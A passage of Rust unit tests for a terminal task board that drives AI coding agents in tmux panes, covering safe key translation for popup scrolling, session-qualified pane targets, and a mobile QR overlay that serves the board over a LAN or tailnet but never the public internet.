    app.handle_key(key_event(KeyCode::PageUp, KeyModifiers::NONE))
        .unwrap();
    app.handle_key(key_event(KeyCode::PageDown, KeyModifiers::NONE))
        .unwrap();
    app.handle_key(key_event(KeyCode::Char('g'), KeyModifiers::CONTROL))
        .unwrap();

    let keys: Vec<String> = sink
        .taken()
        .into_iter()
        .map(|input| match input {
            PaneInput::Key { key, .. } => key,
            other => panic!("expected a key, got {other:?}"),
        })
        .collect();
    // Ctrl+N/P use the safe translation. `Up`/`Down` would scroll Claude's
    // transcript view but
    // recall prompt history in its main view, overwriting the composer — see
    // `handle_popup_scroll`.
    assert_eq!(
        keys,
        vec!["PageUp", "PageDown", "PageUp", "PageDown", "PageUp", "PageDown", "End"]
    );
    assert_eq!(
        app.state.shell_popup.as_ref().unwrap().scroll_offset,
        0,
        "agtx must not also move its own buffer"
    );
}

#[test]
#[cfg(feature = "test-mocks")]
fn a_delegated_scroll_only_ever_sends_a_paging_key() {
    // Passing the chord through instead of translating it would send `C-d` —
    // an EOF that can end the session — and `C-u`, which kills the line the
    // user is typing in the agent's composer.
    let (mut app, sink) = app_with_open_popup();
    with_scrollback(&mut app, 0);
    for code in [KeyCode::Char('d'), KeyCode::Char('u'), KeyCode::Char('g')] {
        app.handle_key(key_event(code, KeyModifiers::CONTROL))
            .unwrap();
    }
    for input in sink.taken() {
        match input {
            PaneInput::Key { key, .. } => assert!(
                matches!(key.as_str(), "PageUp" | "PageDown" | "End"),
                "only keys that cannot alter the composer may be delegated; got {key}"
            ),
            other => panic!("expected a key, got {other:?}"),
        }
    }
}

#[test]
#[cfg(feature = "test-mocks")]
fn unknown_pane_metrics_keep_the_popups_own_scrolling() {
    // A failed `display -p` must not silently reroute keys into the agent.
    let (mut app, sink) = app_with_open_popup();
    if let Some(popup) = app.state.shell_popup.as_mut() {
        popup.metrics = None;
        popup.cached_content = b"a\nb\nc\n".to_vec();
    }
    app.handle_key(key_event(KeyCode::Char('p'), KeyModifiers::CONTROL))
        .unwrap();
    assert!(sink.taken().is_empty());
    assert!(app.state.shell_popup.as_ref().unwrap().scroll_offset < 0);
}

#[test]
#[cfg(feature = "test-mocks")]
fn a_full_queue_warns_instead_of_sending_out_of_order() {
    // Sending this key synchronously would put it ahead of everything already
    // queued. A dropped key the user is told about beats a reordered one.
    let (mut app, sink) = app_with_open_popup();
    sink.fail_with(crate::tmux::InputError::QueueFull);
    app.handle_key(key_event(KeyCode::Char('x'), KeyModifiers::NONE))
        .unwrap();
    let warning = app
        .state
        .warning_message
        .as_ref()
        .map(|(text, _)| text.clone())
        .unwrap_or_default();
    assert!(
        warning.contains("dropped"),
        "the user must be told a keystroke was dropped, got {warning:?}"
    );
}

#[test]
#[cfg(feature = "test-mocks")]
fn an_escalation_banner_swallows_only_the_first_key() {
    let (mut app, sink) = app_with_open_popup();
    if let Some(popup) = app.state.shell_popup.as_mut() {
        popup.escalation_note = Some("needs a human".to_string());
    }
    app.handle_key(key_event(KeyCode::Char('a'), KeyModifiers::NONE))
        .unwrap();
    assert!(sink.taken().is_empty(), "the banner ate the keystroke");
    app.handle_key(key_event(KeyCode::Char('b'), KeyModifiers::NONE))
        .unwrap();
    assert_eq!(
        sink.taken(),
        vec![PaneInput::Text {
            target: "proj:task".to_string(),
            text: "b".to_string(),
        }]
    );
}

#[test]
fn a_popup_target_always_names_its_session() {
    // A bare window name is resolved inside whichever session the issuing client
    // is bound to — the attached one for the control client, the
    // most-recently-used one for a subprocess. Neither is reliably this
    // project's after a switch, and `orchestrator` exists in every project's
    // session, so a bare target could type into another project's agent.
    assert_eq!(pane_target("proj", "task-abc"), "proj:task-abc");
    assert_eq!(pane_target("proj", "orchestrator"), "proj:orchestrator");
    // Idempotent: the orchestrator builds its target qualified already, and
    // re-qualifying would produce `proj:proj:orchestrator`, which resolves to
    // nothing at all.
    assert_eq!(
        pane_target("proj", "proj:orchestrator"),
        "proj:orchestrator"
    );
}

#[test]
fn control_mode_is_on_unless_turned_off() {
    // There is no config field: a connection that fails or dies already falls
    // back to the subprocess backend by itself. `AGTX_TMUX_CONTROL` stays as a
    // one-run escape hatch so a bug report can be bisected across the two lanes.
    assert!(control_mode_from_env(None), "on when nothing is set");
    for off in ["0", "false", "no"] {
        assert!(!control_mode_from_env(Some(off)), "{off} turns it off");
    }
    for on in ["1", "true", "yes"] {
        assert!(control_mode_from_env(Some(on)), "{on} leaves it on");
    }
    // Anything unrecognised must not read as "off" — a typo in the escape hatch
    // should leave the default alone rather than silently change lanes.
    assert!(control_mode_from_env(Some("maybe")));
    assert!(control_mode_from_env(Some("")));
}

#[test]
fn an_unmapped_key_is_dropped_rather_than_guessed() {
    // A key with no tmux name has no correct encoding; inventing one would type
    // something the user did not press.
    assert_eq!(
        popup_key_input(
            "t",
            crossterm::event::KeyEvent::new(KeyCode::CapsLock, KeyModifiers::NONE)
        ),
        None
    );
}

// =============================================================================
// The `W` overlay — serving the board to a phone
// =============================================================================

#[test]
#[cfg(feature = "test-mocks")]
fn test_w_opens_the_mobile_overlay_and_esc_closes_it() {
    let mut app = make_test_app();
    assert!(app.state.mobile_popup.is_none());

    press_key(&mut app, KeyCode::Char('W'));
    assert!(
        app.state.mobile_popup.is_some(),
        "W did not open the overlay"
    );
    assert!(app.draw().is_ok());

    press_key(&mut app, KeyCode::Esc);
    assert!(app.state.mobile_popup.is_none());
}

/// The overlay swallows keys rather than letting them reach the board behind
/// it — otherwise `x` would delete the selected *task* while someone is aiming
/// at a device row.
#[test]
#[cfg(feature = "test-mocks")]
fn test_the_mobile_overlay_swallows_board_keys() {
    let mut app = make_test_app();
    let before = app.state.board.tasks.len();

    press_key(&mut app, KeyCode::Char('W'));
    for key in ['x', 'o', 'd', 'm', 'p'] {
        press_key(&mut app, KeyCode::Char(key));
    }

    assert!(app.state.mobile_popup.is_some(), "a key closed the overlay");
    assert_eq!(
        app.state.board.tasks.len(),
        before,
        "a key reached the board behind the overlay"
    );
    assert!(
        app.state.wizard.is_none(),
        "`o` opened the wizard underneath"
    );
}

/// Everything currently on the test terminal, as one string.
///
/// Reads the cells rather than any of the app's own state, so it sees what a
/// person would see — which is the point when the bug under test is bytes
/// reaching the screen that should never have been drawn.
#[cfg(feature = "test-mocks")]
fn rendered_text(app: &App) -> String {
    match app.terminal.backend() {
        AppBackend::Test(backend) => {
            let buffer = backend.buffer();
            let area = buffer.area();
            (0..area.height)
                .map(|y| {
                    (0..area.width)
                        .map(|x| buffer[(x, y)].symbol())
                        .collect::<String>()
                })
                .collect::<Vec<_>>()
                .join("\n")
        }
        _ => String::new(),
    }
}

/// A QR drawn through ratatui must be **styled spans**, never the ANSI string
/// the CLI banner prints: ratatui does not interpret escape sequences, so those
/// bytes would be drawn as literal garbage — a QR that cannot scan and looks
/// like corruption.
#[test]
#[cfg(all(feature = "test-mocks", feature = "serve"))]
fn test_the_overlay_never_draws_raw_ansi() {
    let mut app = make_test_app();
    press_key(&mut app, KeyCode::Char('W'));
    assert!(app.draw().is_ok());

    let rendered = rendered_text(&app);
    assert!(
        !rendered.contains('\u{1b}') && !rendered.contains("[97m") && !rendered.contains("[107m"),
        "an escape sequence reached the screen: {rendered:?}"
    );
}

/// Closing the overlay must not stop the server: the point is to scan, close,
/// and carry on using the board.
///
/// This needs a live session to mean anything. An earlier version of this test
/// had none and asserted only that the overlay opened and closed — so it passed
/// while `Esc` was killing the child, because `MobilePopup` owned the
/// `ServeSession` and dropping the view dropped the server. The session now
/// lives on `AppState`; this is what holds that.
#[test]
#[cfg(feature = "test-mocks")]
fn test_closing_the_overlay_does_not_stop_serving() {
    use crate::tui::serve_control::{MobilePopup, ServeSession};

    let mut app = make_test_app();
    // A stand-in child that stays alive long enough to observe.
    let child = std::process::Command::new("sleep")
        .arg("30")
        .stdin(std::process::Stdio::null())
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::null())
        .spawn()
        .expect("spawn a stand-in child");
    app.state.serve_session = Some(ServeSession::for_test(
        child,
        "http://10.0.0.2:8787/#pair=x",
    ));
    app.state.mobile_popup = Some(MobilePopup::new());

    press_key(&mut app, KeyCode::Esc);
    assert!(
        app.state.mobile_popup.is_none(),
        "Esc should close the overlay"
    );
    assert!(
        app.state.serve_session.is_some(),
        "closing the overlay stopped the server"
    );
    // And the child is genuinely still running, not merely still referenced.
    assert!(
        app.state.serve_session.as_mut().unwrap().check().is_none(),
        "the child exited when the overlay closed"
    );

    // Reopening finds it still serving.
    press_key(&mut app, KeyCode::Char('W'));
    assert!(app.state.mobile_popup.is_some());
    assert!(app.state.serve_session.is_some());

    // Quitting is what stops it.
    app.state.serve_session = None;
}

/// `move_selection` is the only thing standing between an empty device list and
/// an index panic on the next draw.
#[test]
#[cfg(feature = "test-mocks")]
fn test_device_selection_is_clamped() {
    use crate::tui::serve_control::MobilePopup;

    let mut popup = MobilePopup {
        devices: Vec::new(),
        selected: 0,
        message: None,
    };
    popup.move_selection(1);
    popup.move_selection(-1);
    assert_eq!(popup.selected, 0, "an empty list must not move the cursor");

    popup.devices = vec![
        crate::db::MobileDevice::new("a", "h1"),
        crate::db::MobileDevice::new("b", "h2"),
    ];
    popup.move_selection(5);
    assert_eq!(popup.selected, 1, "selection ran past the end");
    popup.move_selection(-5);
    assert_eq!(popup.selected, 0, "selection ran before the start");
}

/// A QR invites the assumption that it works from anywhere. A private address
/// does not, and the failure — a phone on mobile data timing out against an
/// unroutable host — looks like broken pairing rather than a network that was
/// never going to carry it. So the overlay says which it is.
#[test]
#[cfg(feature = "test-mocks")]
fn test_a_lan_only_url_is_named_as_such() {
    use crate::tui::serve_control::ServeSession;

    for private in [
        "http://192.168.178.26:8787/#pair=abc",
        "http://10.0.0.4:8787/#pair=abc",
        "http://172.16.5.9:8787/#pair=abc",
        "http://127.0.0.1:8787/#pair=abc",
        "http://169.254.1.1:8787/#pair=abc",
    ] {
        assert!(
            ServeSession::lan_only_url(private),
            "{private} should be flagged as LAN-only"
        );
    }

    for reachable in [
        "https://mac.tailnet.ts.net/#pair=abc",
        "https://brave-fox-1234.trycloudflare.com/#pair=abc",
        "http://203.0.113.7:8787/#pair=abc",
    ] {
        assert!(
            !ServeSession::lan_only_url(reachable),
            "{reachable} should not be flagged as LAN-only"
        );
    }
}

/// Tailscale reports a fully-qualified name with the root dot. Leaving it on
/// produces a URL some clients accept and others reject — the worst of both.
#[test]
#[cfg(all(feature = "test-mocks", feature = "serve"))]
fn test_the_tailnet_hostname_is_parsed_and_trimmed() {
    use crate::web::tunnel::parse_tailnet_hostname;

    let json = r#"{"Self":{"DNSName":"macbook.tail1a2b.ts.net.","HostName":"macbook"}}"#;
    assert_eq!(
        parse_tailnet_hostname(json).as_deref(),
        Some("macbook.tail1a2b.ts.net")
    );

    // Not signed in, or a shape we do not recognise: no hostname rather than a
    // guess, so the overlay says it cannot serve instead of building a URL
    // that resolves nowhere.
    assert_eq!(parse_tailnet_hostname(r#"{"Self":{}}"#), None);
    assert_eq!(parse_tailnet_hostname(r#"{"Self":{"DNSName":"."}}"#), None);
    assert_eq!(parse_tailnet_hostname("not json"), None);
    assert_eq!(parse_tailnet_hostname("{}"), None);
}

/// The overlay's body is drawn unwrapped — wrapping would break the QR's rows
/// into nonsense — so a line longer than the box is silently truncated. A
/// sentence losing its last word reads as a typo rather than a layout bug, so
/// the box has to be wide enough for everything it says.
#[test]
#[cfg(all(feature = "test-mocks", feature = "serve"))]
fn test_the_mobile_overlay_never_truncates_its_own_text() {
    let mut app = make_test_app();
    press_key(&mut app, KeyCode::Char('W'));

    app.draw().unwrap();
    let screen = rendered_text(&app);
    for line in screen.lines().filter(|l| l.contains('│')) {
        let inner = line.trim_matches(|c| c != '│').trim_matches('│');
        // A body line that ends flush against the border, with no space before
        // it, is one that ran out of room.
        assert!(
            inner.is_empty() || inner.ends_with(' ') || inner.trim().is_empty(),
            "a line reaches the border and is probably cut: {inner:?}"
        );
    }
}

/// `s` and `t` are each a whole action — serve to this wifi, serve via the
/// tailnet — rather than one key setting a mode another key acts on. A hidden
/// mode means neither label can say what pressing it will do, which is the
/// confusion this design replaced.
#[test]
#[cfg(all(feature = "test-mocks", feature = "serve"))]
fn test_the_overlay_offers_both_reaches_directly() {
    let mut app = make_test_app();
    press_key(&mut app, KeyCode::Char('W'));
    app.draw().unwrap();
    let screen = rendered_text(&app);

    assert!(screen.contains("local network"), "{screen}");
    assert!(screen.contains("tailnet"), "{screen}");
    assert!(
        screen.contains("this wifi only"),
        "the wifi option must say it is unroutable off the network: {screen}"
    );
    assert!(
        !screen.contains("t to switch"),
        "nothing should still advertise the removed mode toggle"
    );
}

/// Only those two behind a key. `--tunnel public` publishes an endpoint that
/// can type into a running agent; that should cost more than one keystroke.
#[test]
#[cfg(all(feature = "test-mocks", feature = "serve"))]
fn test_the_overlay_never_offers_the_public_internet() {
    let mut app = make_test_app();
    press_key(&mut app, KeyCode::Char('W'));
    app.draw().unwrap();
    let screen = rendered_text(&app).to_lowercase();
    assert!(
        !screen.contains("public") && !screen.contains("funnel"),
        "the overlay offers public exposure: {screen}"
    );
}
